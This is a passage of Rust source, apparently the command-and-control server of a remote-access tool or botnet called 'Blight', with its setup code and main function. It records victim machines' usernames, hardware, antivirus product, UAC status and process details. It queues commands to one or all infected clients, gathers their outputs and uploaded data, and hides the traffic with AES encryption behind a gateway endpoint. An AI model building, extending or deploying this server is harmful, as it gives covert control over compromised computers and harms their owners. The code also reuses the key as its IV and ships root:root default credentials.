            "load_id" => load_id,
        }
    ).await;

    match load_query {
        Ok(None) => false,
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!("At is_load: {}", e));
            false
        },
    }
}

async fn is_block(connection: &mut Conn, block_id: &str) -> bool { 

    let block_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT block_id FROM blocks WHERE block_id = :block_id",
        params! {
            "block_id" => block_id,
        }
    ).await;

    match block_query {
        Ok(None) => false,
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!("At is_block: {}", e));
            false
        },
    }
}


async fn update_last_seen(connection: &mut Conn, client_id: &str) -> () {
    let _: std::result::Result<Option<u64>, Error>  = connection.exec_first(
        r"UPDATE clients SET last_seen = :last_seen WHERE client_id = :client_id",
        params! {
            "last_seen" => get_timestamp(),
            "client_id" => client_id
        }
    ).await;
}

async fn get_last_seen(connection: &mut Conn, client_id: &str) -> u64 {

    let last_seen_query: std::result::Result<Option<u64>, Error>  = connection.exec_first(
        r"SELECT last_seen FROM clients WHERE client_id = :client_id",
        params! {
            "client_id" => &client_id,
        }
    ).await;

    match last_seen_query {
        Ok(None) =>  {
            return 0
        },
        
        Ok(_) =>  {
            last_seen_query.unwrap().unwrap()
        },

        Err(e) => {
            fprint("error", &format!("At get_last_seen: {}", e));
            return 0
        },
    }
}

async fn get_encryption_key(connection: &mut Conn, client_id: &str) -> std::result::Result<String, GenericError> {

    if client_id == "N/A" {
        return Err(GenericError::NoRows)
    }

    let encryption_key_query: std::result::Result<Option<(String, u64)>, Error>  = connection.exec_first(
        r"SELECT encryption_key, key_expiration FROM clients WHERE client_id = :client_id",
        params! {
            "client_id" => &client_id,
        }
    ).await;

    match encryption_key_query {
        Ok(None) =>  { Err(GenericError::NoRows) },
        Ok(_) =>  { 
            let encryption_key_query = encryption_key_query.unwrap().unwrap();
            let encryption_key = encryption_key_query.0;
            let expiration_time = encryption_key_query.1;

            if expiration_time < get_timestamp() {
                return Err(GenericError::_Expired)
            } else {
                return Ok(encryption_key)
            }
        },
        Err(error) => {
            fprint("error", &format!("(get_encryption_key): {}", error));
            Err(GenericError::Mysql(error))
        }
    }
}



async fn block_client(connection: &mut Conn, client_id: &str, reason: &str, ip: &str, duration: u64) -> bool {
    let enable_firewall = *ENABLE_FIREWALL.read().unwrap();
    if !enable_firewall {return false};

    let banned_until = get_timestamp() + duration;

    let result = connection.exec_drop(
    r"INSERT INTO blocks (block_id, client_id, reason, ip, banned_until) VALUES (:block_id, :client_id, :reason, :ip, :banned_until)",
    params! {
        "block_id" => generate(8, CHARSET),
        "client_id" => &client_id,
        "reason" => &reason,
        "ip" => &ip,
        "banned_until" => &banned_until

    }
    ).await;

    match result {
        Ok(_) => {
            fprint("restricted", &format!("Client {} from IP {} was blocked for {} for: \"{}\"", client_id, ip, duration, reason));
            true
        },
        Err(e) => {
            fprint("error", &format!("(block_client): {}", e));
            false
        }
    }

   
}


async fn is_client_blocked(connection: &mut Conn, client_id: &str, ip: &str) -> bool {
    
    let enable_firewall = *ENABLE_FIREWALL.read().unwrap();
    let blocked_client_query: std::result::Result<Option<u64>, Error>;
    if !enable_firewall {return false;}

    if client_id != "N/A" {
        blocked_client_query = connection.exec_first(
            r"SELECT banned_until FROM blocks WHERE client_id = :client_id OR ip = :ip",
            params! {
                "client_id" => &client_id,
                "ip" => &ip,
            }
        ).await;
    } else {
       blocked_client_query = connection.exec_first(
            r"SELECT banned_until FROM blocks WHERE ip = :ip",
            params! {
                "ip" => &ip,
            }
        ).await;
    }

    match blocked_client_query {
        Ok(None) => false,
        Ok(_) =>  {
            if blocked_client_query.unwrap().unwrap() < get_timestamp() {

                if client_id != "N/A" {
                    let _: std::result::Result<Option<bool>, Error>  = connection.exec_first(
                        r"DELETE FROM blocks WHERE client_id = :client_id OR ip = :ip",
                        params! {
                            "client_id" => &client_id,
                            "ip" => &ip,
                        }
                    ).await;
                } else {
                    let _: std::result::Result<Option<bool>, Error>  = connection.exec_first(
                        r"DELETE FROM blocks WHERE ip = :ip",
                        params! {
                            "ip" => &ip,
                        }
                    ).await;
                }

                false
            } else {
                true
            }
        },
        Err(e) => {
            fprint("error", &format!(
                "At is_client_blocked: {}", 
                e
            ));
            false
        },
    }
}

async fn task_all_clients(cmd_args: &str, cmd_type: &str, load_id: &str) -> () {


    let mut connection:Conn = obtain_connection().await;
    let mut connection2: Conn = obtain_connection().await;
    
    let selected_clients = connection2.query_iter("SELECT client_id from clients").await.unwrap().collect::<Row>().await;
    connection.query_drop("START TRANSACTION").await.unwrap();

    for row in selected_clients.unwrap() {       

        let command_id = generate(8, CHARSET);
        let client_id = value_to_str(&row, 0);

        let command_insert_sql: std::result::Result<Vec<String>, Error> = connection.exec(  
            r"
            INSERT INTO commands (
                command_id, client_id, load_id,
                cmd_type, cmd_args, 
                time_issued
            ) VALUES (
                :command_id, :client_id, :load_id,
                :cmd_type, :cmd_args,
                :time_issued
            )",
            params! {
                "command_id" => &command_id,
                "client_id" => &client_id,
                "load_id" => &load_id,
                "cmd_type" => &cmd_type,
                "cmd_args" => &cmd_args,
                "time_issued" => get_timestamp(),
            }
        ).await;
    
        match command_insert_sql {
            Ok(_) => (),
            Err(e) => {
                fprint("error", &format!("Tasking all clients failed: {}", e));
                panic!()
            }
        }
    }
    connection.query_drop("COMMIT").await.unwrap();
}

async fn task_client(connection: &mut Conn, client_id: &str, cmd_args: &str, cmd_type: &str) -> bool{
    let command_id = generate(8, CHARSET);
    let task_client_sql_success = connection.exec_drop(  
        r"
        INSERT INTO commands (
            command_id, client_id, cmd_type,
            cmd_args, time_issued
        ) VALUES (
            :command_id, :client_id, :cmd_type, :cmd_args, :time_issued
        )",
        params! {
            "command_id" => &command_id,
            "client_id" => &client_id,
            "cmd_type" => &cmd_type,
            "cmd_args" => &cmd_args,
            "time_issued" => get_timestamp(),
        }
    ).await;

    match task_client_sql_success {
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!(
                "(task_client): {}", 
                e
            ));
            false
        }
    }
}

async fn get_current_client_command(connection: &mut Conn, client_id: &str) -> std::result::Result<(String, String, String), GenericError> {
    
    let command_fetch_sql = connection.exec_first(
        r"SELECT command_id, cmd_args, cmd_type FROM commands WHERE client_id = :client_id",
        params! {
            "client_id" => client_id,
        }
    ).await;

    match command_fetch_sql {

        Ok(None) => {
            Err(GenericError::NoRows)
        },
        Ok(_) => {
            let unwrapped: (String, String, String) = command_fetch_sql.unwrap().unwrap();
            Ok((
                unwrapped.0,
                unwrapped.1,
                unwrapped.2,
            ))
        },
        Err(e) => {

            fprint("error", &format!(
                "(get_current_client_command): {}", 
                &e
            ));            
            Err(GenericError::Mysql(e))
        }
    }
}

async fn get_command_info(connection: &mut Conn, command_id: &str) -> std::result::Result<(String, String, String, u64), GenericError> {

    let command_fetch_sql = connection.exec_first(
        r"SELECT command_id, cmd_args, cmd_type, time_issued FROM commands WHERE command_id = :command_id",
        params! {
            "command_id" => command_id,
        }
    ).await;

    match command_fetch_sql {
       
        Ok(_) => {
            let unwrapped: (String, String, String, u64) = command_fetch_sql.unwrap().unwrap();
            Ok((
                unwrapped.0,
                unwrapped.1,
                unwrapped.2,
                unwrapped.3,
            ))
        },
        Err(e) => {
            fprint("error", &format!(
                "At get_current_client_command: {}", 
                &e
            ));            
            Err(GenericError::Mysql(e))
        }
    }

}

async fn is_command(connection: &mut Conn, command_id: &str, client_id: &str) -> bool {

    let command_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT command_id FROM commands WHERE client_id = :client_id AND command_id = :command_id",
        params! {
            "client_id" => client_id,
            "command_id" => command_id,
        }
    ).await;
    
    match command_query {
        Ok(None) => false,
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!(
                "At is_command: {}", 
                e
            ));
            false
        },
    }
}

async fn is_uncompleted_load(connection: &mut Conn, client_id: &str, load_id: &str) -> bool {
    let loads_query_sql = connection.exec_drop(
        r"SELECT * FROM loads WHERE load_id NOT IN (SELECT command_id FROM outputs WHERE client_id = :client_id) AND load_id = :load_id",
        params! {
            "client_id" => &client_id,
            "load_id" => &load_id,
        }
    ).await;

    match loads_query_sql {
        Ok(_) => true,
        Err(ref e) => {
            fprint("error", &format!(
                "(is_uncompleted_load): {}", 
                e
            ));
            false
        }
    }
}

fn parse_storage_write(storage: &[u8]) -> String {
    let storage_id = generate(16, CHARSET);

    // Try decoding. If decoding fails, do nothing. If decoding succeeds, use that for the rest of the fn.
    let parsed_storage = match BASE64_STANDARD.decode(str::from_utf8(storage).unwrap()) {
        Ok(decoded_blob) => decoded_blob,
        Err(_) => storage.to_owned()
    };

    if (&parsed_storage).len() >= 512 {
        let mut file = File::create(format!("artifacts/storages/{}", &storage_id)).unwrap();
        file.write_all(&compress_bytes(&parsed_storage)).unwrap();
        return format!("storage:{}", storage_id)
    } else {
        match String::from_utf8(parsed_storage.to_owned()) {
            Ok(stringaling) => return stringaling,
            Err(error) => {
                fprint("error", &format!("(parse_storage_write, writing): storage ID {}: {}", &storage_id, error));
                return String::from("Invalid storage")
            }
        }
    }

}


fn parse_storage_read(storage_id: &str) -> Vec<u8> {
    if (&storage_id).starts_with("storage:") {
        let storage_id = storage_id.split(":").collect::<Vec<&str>>()[1];
        match fs::read(format!("artifacts/storages/{}", storage_id)) {
            Ok(result) => {
                return decompress_bytes(&result);
            },
            Err(error) => {
                fprint("error", &format!("(parse_storage_read): storage ID {}: {}", &storage_id, error));
                return "Invalid storage".as_bytes().to_vec();
            }
        };
    } else {
        return "Invalid storage".as_bytes().to_vec();
    }
} 

// ------------------------ General Functions ------------------------


fn get_timestamp() -> u64 {
    let since_the_epoch = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("Time went backwards lmao");
    return since_the_epoch.as_secs()
}



fn aes_256cbc_encrypt(data: &str, key: &[u8]) -> core::result::Result<String, symmetriccipher::SymmetricCipherError> {

    let mut encryptor = aes::cbc_encryptor(
            aes::KeySize::KeySize256,
            key,
            &key[..16],
            blockmodes::PkcsPadding);
   
    let mut final_result = Vec::<u8>::new();
    let mut read_buffer = buffer::RefReadBuffer::new(data.as_bytes());
    let mut buffer = [0; 4096];
    let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);

    loop {
        let result = encryptor.encrypt(&mut read_buffer, &mut write_buffer, true)?;

        final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));

        match result {
            BufferResult::BufferUnderflow => break,
            BufferResult::BufferOverflow => { }
        }
    }

    Ok(BASE64_STANDARD.encode(final_result))
}

fn aes_256cbc_decrypt(encrypted_data: &str, key: &[u8]) -> core::result::Result<Vec<u8>, symmetriccipher::SymmetricCipherError> {

    let encrypted_data = BASE64_STANDARD.decode(encrypted_data).unwrap();
    let mut decryptor = aes::cbc_decryptor(
            aes::KeySize::KeySize256,
            key,
            &key[..16],
            blockmodes::PkcsPadding);

    let mut final_result = Vec::<u8>::new();
    let mut read_buffer = buffer::RefReadBuffer::new(encrypted_data.as_slice());
    let mut buffer = [0; 4096];
    let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);

    loop {
        let result = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true)?;
        final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
        match result {
            BufferResult::BufferUnderflow => break,
            BufferResult::BufferOverflow => { }
        }
    }

    Ok(final_result)
}

fn fprint(stype: &str, sformatted: &str) -> () {
    
    let color = match stype {
        "info" => stype.to_uppercase().cyan(),
        "error" => stype.to_uppercase().red(),
        "failure" => stype.to_uppercase().red(),
        "restricted" => stype.to_uppercase().red(),
        "success" => stype.to_uppercase().green(),
        "task" => stype.to_uppercase().yellow(),
        _ => stype.to_uppercase().white(),
    };


    println!("[{} - {}] {}", get_timestamp().to_string().white(), color, sformatted);
}


fn value_to_str(row: &mysql_async::Row, index: usize) -> String {
    if let Some(value) = row.as_ref(index) {
        match value {
            Value::NULL => String::from(""),
            Value::Bytes(v) => String::from_utf8_lossy(v.as_slice()).into_owned(),
            Value::Int(v) => format!("{v}"),
            Value::UInt(v) => format!("{v}"),
            Value::Float(v) => format!("{v}"),
            Value::Double(v) => format!("{v}"),
            Value::Date(_year, _month, _day, _hour, _minutes, _seconds, _micro) => todo!(),
            Value::Time(_negative, _days, _hours, _minutes, _seconds, _micro) => todo!(),
        }
    } else {
        String::from("")
    }
}

fn value_to_u64(row: &mysql_async::Row, index: usize) -> u64 {return value_to_str(row, index).parse::<u64>().unwrap();}
fn value_to_bool(row: &mysql_async::Row, index: usize) -> bool { match value_to_u64(row, index) {1 => true, 0 => false, _ => panic!("Not a bool")} }

fn key_to_string(json: &serde_json::Value, json_key: &str) -> String {String::from(json[json_key].as_str().unwrap())}
fn key_to_u64(json: &serde_json::Value, json_key: &str) -> u64 {json[json_key].as_u64().unwrap()}
fn key_to_bool(json: &serde_json::Value, json_key: &str) -> bool {json[json_key].as_bool().unwrap()}
fn key_exists(json: &serde_json::Value, json_key:&str) -> bool {if let Some(_) = json.get(json_key) {return true} else {return false}}

fn all_keys_valid(json: &serde_json::Value, keys: Vec<&str>, types: Vec<&str>) -> bool {
    let mut counter: usize = 0;
    for key in keys {
        if let Some(_) = json.get(key) {
            // Check if key is one of the valid types:
            if types[counter] == "String" {
                match json[key].as_str() {
                    Some(_) => (),
                    None => return false,
                };
            } else if types[counter] == "u64" {
                match json[key].as_u64() {
                    Some(_) => (),
                    None => return false,
                };
            } else if types[counter] == "bool" {
                match json[key].as_bool() {
                    Some(_) => (),
                    None => return false,
                };
            }
        } else {
            return false;
        }
        counter += 1;
    }
    return true
}

async fn ip_to_country(ip: &str) -> String {
    let ip_db = &*IP_DATABASE.read().unwrap();
    let reader = maxminddb::Reader::from_source(ip_db).unwrap();
    let ip: IpAddr = ip.parse().unwrap();
    let country: std::prelude::v1::Result<geoip2::Country, maxminddb::MaxMindDBError> = reader.lookup(ip);
    match country {
        Ok(_) => String::from(country.unwrap().country.unwrap().iso_code.unwrap()),
        Err(_) => String::from("NL")
    }
}

fn argon2_hash(input: &[u8]) -> String {
    let salt = SaltString::generate(&mut OsRng);
    let params = 
        ParamsBuilder::new()
        .m_cost(2_u32.pow(4))
        .t_cost(16)
        .p_cost(2)
        .build()
        .unwrap();

    let argon2 = Argon2::new(argon2::Algorithm::Argon2id, argon2::Version::V0x13, params);
    return argon2.hash_password(input, &salt).unwrap().to_string();    
}

fn verify_argon2(hash: &str, input: &[u8]) -> bool {

    return Argon2::default().verify_password(
        input, &PasswordHash::parse(&hash, argon2::password_hash::Encoding::B64
    ).unwrap()).is_ok();
}

pub fn random_bytes(len: usize) -> Vec<u8> {
    let mut buffer = vec![0; len];
    rand::thread_rng().fill_bytes(&mut buffer);
    buffer[..].to_vec()
}


// ------------------------ HTTP Responses ------------------------

fn resp_unauthorised() -> HttpResponse {
    return HttpResponse::build(StatusCode::UNAUTHORIZED).body("You do not have the required authorization to complete this request.");
}

fn resp_badrequest() -> HttpResponse {
    return HttpResponse::build(StatusCode::BAD_REQUEST).body("Your request was malformed. Check the information you provided alongside this request.");
}

fn resp_unsupported() -> HttpResponse {
    return HttpResponse::build(StatusCode::UNPROCESSABLE_ENTITY).body("The information you submitted or the feature you requested isn't yet supported.");
}

fn resp_servererror() -> HttpResponse {
    return HttpResponse::build(StatusCode::INTERNAL_SERVER_ERROR).body("The server is overwhelmed or under maintinence. Retry your request at a later date.");
}

fn resp_ok(message: String) -> HttpResponse {
    return HttpResponse::build(StatusCode::OK).body(message);
}

async fn resp_ok_encrypted(message: &str, key: &[u8]) -> HttpResponse {
    return HttpResponse::build(StatusCode::OK).body(aes_256cbc_encrypt(message, key).unwrap());
}

// ------------------------ Init Functions ------------------------


async fn initialize_tables(connection_pool: Pool) {
    let mut connection: Conn = connection_pool.get_conn().await.expect("Unable to connect to database.");

    connection.query_drop(r"
    
        SET GLOBAL query_cache_size = 268435455;

    ").await.expect("Failed to init db");

    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS clients (
            client_id TEXT,
            version INTEGER,
            uac BOOL,
            ip TEXT,
            country TEXT,
            username TEXT,
            guid TEXT,
            cpu TEXT,
            gpu TEXT,
            ram INTEGER,
            antivirus TEXT,
            path TEXT,
            pid INTEGER,
            last_seen INTEGER,
            first_seen INTEGER,
            encryption_key TEXT,
            key_expiration INT
        )  ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_clients_client_id ON clients (client_id);
        ").await.expect("clients table creation failed");

    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS purgatory (
            request_ip TEXT,
            encryption_key TEXT,
            expiration_time INT
        )  ENGINE=InnoDB;
        ").await.expect("purgatory table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS commands (
            command_id TEXT,
            load_id TEXT,
            client_id TEXT,
            cmd_type TEXT,
            cmd_args TEXT,
            time_issued INT
        ) ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_commands_client_id ON commands (client_id);
        CREATE INDEX IF NOT EXISTS idx_commands_command_id ON commands (command_id);

        ").await.expect("commands table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS outputs (
            output_id TEXT,
            command_id TEXT,
            client_id TEXT,
            cmd_args TEXT,
            cmd_type TEXT,
            output TEXT,
            time_issued INT,
            time_received INT
        ) ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_outputs_client_id ON outputs (client_id);
        CREATE INDEX IF NOT EXISTS idx_outputs_command_id ON outputs (command_id);
        CREATE INDEX IF NOT EXISTS idx_outputs_output_id ON outputs (output_id);
        ").await.expect("outputs table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS loads (
            load_id TEXT,
            required_amount INT,
            is_recursive BOOL,
            cmd_args TEXT,
            cmd_type TEXT,
            time_issued INT
        ) ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_loads_load_id ON loads (load_id);
        ").await.expect("loads table creation failed");
    
    connection.query_drop(
        r"
        CREATE TABLE IF NOT EXISTS blocks (
            block_id TEXT,
            client_id TEXT,
            reason TEXT,
            ip TEXT,
            banned_until INT
        ) ENGINE=InnoDB;
    
        CREATE INDEX IF NOT EXISTS idx_blocks_client_id ON blocks (client_id);
        CREATE INDEX IF NOT EXISTS idx_blocks_ip ON blocks (ip);
        ").await.expect("blocks table creation failed");

}


// Add error handling to these 2 functions.
fn compress_bytes(input: &[u8]) -> Vec<u8>{
    let mut compressor = GzEncoder::new(Vec::new(), Compression::best());
    compressor.write_all(&input).unwrap();
    return compressor.finish().unwrap()
}

fn decompress_bytes(input: &[u8]) -> Vec<u8>{
    let mut decompressor: GzDecoder<&[u8]> = GzDecoder::new(input);
    let mut decompressed_bytes: Vec<u8> = Vec::new();
    decompressor.read_to_end(&mut decompressed_bytes).unwrap();
    return decompressed_bytes;
}

// ------------------------ Main Program ------------------------


#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let enabled = colored::control::set_virtual_terminal(true).unwrap();

    println!("
    _                 
    /_  //  .  __   /_  -/-
  _/_)_(/__/__(_/__/ (__/_ 
              _/_          
             (/            
                           
    ");

    // Set open file limit to really high
    Command::new("ulimit")
    .arg("-n")
    .arg("524288");

    let json_config = fs::read("artifacts/configuration/server_config.json");

    fs::create_dir_all("artifacts/storages").unwrap();
    fs::create_dir_all("artifacts/configuration").unwrap();
    fs::create_dir_all("artifacts/keys").unwrap();
    fs::create_dir_all("artifacts/databases").unwrap();

    match json_config {
        Ok(_) => (),
        Err(_) => {
            write!(File::create("artifacts/configuration/server_config.json").unwrap(), "{}", serde_json::to_string_pretty(
                &json!({
                    "host": "127.0.0.1:9999",
                    "connection_interval": 60,
                    "mysql_server": "mysql://root:root@127.0.0.1:3306/mydb",
                    "api_secret": "root",
                    "ENABLE_FIREWALL": false
                })
            ).unwrap()).expect("Unable to write json file.");

            fprint("info", "Your \"artifacts/configuration/server_config.json\" file wasn't present. No worries, we've created it for you. ");
            fprint("info", "Open it in a text editor, and fill out the fields. Then, re-run Blight.");
            exit(1);
        }
    };

    let parsed_json_config: serde_json::Value = serde_json::from_str(str::from_utf8(&json_config.unwrap()).unwrap()).expect("erm");

    fprint("task", "We're setting up your server. This might take a few, hang tight.");
    let connection_pool: Pool = Pool::new(Opts::from_url(&key_to_string(&parsed_json_config, "mysql_server")).unwrap());
    let geolite_db = fs::read("artifacts/databases/GeoLite2-Country.mmdb");

    match geolite_db {
        Ok(_) => (),
        Err(_) => {
            fprint("error", "You don't have \"GeoLite2-Country.mmdb\" dowloaded. Find it and place it in \"artifacts/databases\"");
            exit(1);
        }
    };

    if !Path::new("artifacts/keys/private.pem").exists() {
        let mut rng = rand::thread_rng();
        let priv_key = RsaPrivateKey::new(&mut rng, 2048).expect("failed to generate a key");
        let pub_key = RsaPublicKey::from(&priv_key);
        
        priv_key.write_pkcs1_pem_file("artifacts/keys/private.pem", rsa::pkcs1::LineEnding::LF).unwrap();
        pub_key.write_pkcs1_pem_file("artifacts/keys/public.pem", rsa::pkcs1::LineEnding::LF).unwrap();

        fprint("success", "RSA key pair was created, since there wasn't one before.");
    }

    *CONNECTION_POOL.write().unwrap() = connection_pool.clone();
    *CONNECTION_INTERVAL.write().unwrap() = key_to_u64(&parsed_json_config, "connection_interval");
    *PURGATORY_INTERVAL.write().unwrap() = key_to_u64(&parsed_json_config, "purgatory_interval");
    *ENABLE_FIREWALL.write().unwrap() = key_to_bool(&parsed_json_config, "enable_firewall");
    *API_SECRET.write().unwrap() = key_to_string(&parsed_json_config, "api_secret");
    *PRIVATE_KEY.write().unwrap() = RsaPrivateKey::from_pkcs1_pem(&fs::read_to_string("artifacts/keys/private.pem").unwrap()).unwrap();
    *IP_DATABASE.write().unwrap() = geolite_db.unwrap();
    *HOST.write().unwrap() = key_to_string(&parsed_json_config, "host");

    initialize_tables(connection_pool.clone()).await;

    fprint("info", &format!(
        "Server running! Gateway path: {}", 
        format!("http://{}/gateway", key_to_string(&parsed_json_config, "host")).yellow()
    ));
    
    HttpServer::new(move || {
        App::new()
            .app_data(web::PayloadConfig::default().limit(100000000)) // 500mb
            .service(gateway)
            .service(api_issue_load)
            .service(api_clients_list)
            .service(api_get_output)
            .service(loads_list)
            .service(remove_load)
            .service(statistics)
            .service(api_blocks_list)
            .service(api_remove_block)
    })
    .bind(&key_to_string(&parsed_json_config, "host"))? 
    .run()
    .await
}
